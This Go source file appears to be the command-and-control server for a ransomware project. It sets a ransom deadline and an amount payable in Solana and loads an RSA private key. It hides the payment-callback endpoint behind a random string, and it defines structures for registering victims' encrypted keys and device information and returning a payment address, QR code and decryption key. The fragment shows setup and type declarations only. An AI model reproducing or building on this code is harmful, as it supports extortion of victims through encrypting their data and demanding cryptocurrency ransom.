package server

import (
	"fmt"
	"log"
	"time"

	"github.com/Aran404/Forwarder/api/server"
	"github.com/Aran404/Ransomware/c2/crypt"
	"github.com/Aran404/Ransomware/c2/database"
	"github.com/Aran404/Ransomware/c2/types"
	"github.com/go-chi/chi/v5"
)

var (
	RansomDeadline = time.Duration(types.Config.C2.RansomDeadlineHours) * time.Hour
	RansomAmount   = types.Config.C2.RansomAmountSOL // 1 SOL ~$200

	// Used for the payment callback endpoint as extra security to prevent people from finding the endpoint
	PaymentCallbackSnowflake string
	RansomPaidEndpoint       string
	RSAPrivateKey            []byte
)

func init() {
	server.CryptoDeadline = RansomDeadline
	server.ALLOW_LOCAL_HOST = true
	PaymentCallbackSnowflake = types.RandString()
	RansomPaidEndpoint = fmt.Sprintf("/ransom/paid/%s", PaymentCallbackSnowflake)

	var err error
	RSAPrivateKey, err = types.LoadPEMFile("private")
	if err != nil {
		log.Fatal(err)
	}
}

type Client struct {
	http *chi.Mux
	sol  *server.Client
	db   *database.Connection
	rsa  *crypt.RSA
}

type GetKeyBody struct {
	UUID   string   `json:"uuid"`
	Hashes []string `json:"hashes"` // In case the UUID is lost
}

type GetKeyResponse struct {
	Success       bool   `json:"success"`
	EncryptionKey string `json:"encryption_key"` // not encrypted
}

type InitRansomBody struct {
	Hashes       []string       `json:"hashes"`
	EncryptedKey string         `json:"encrypted_key"` // PEM RSA Key
	DeviceInfo   map[string]any `json:"device_info"`
}

type InitRansomResponse struct {
	Success                bool    `json:"success"`
	UUID                   string  `json:"uuid"`
	TimeBeforeDeactivation int64   `json:"time_before_deactivation"`
	Address                string  `json:"address"`
	Amount                 float64 `json:"amount"`
	QRCode                 string  `json:"qrcode"`
	PaymentID              string  `json:"payment_id"`
}
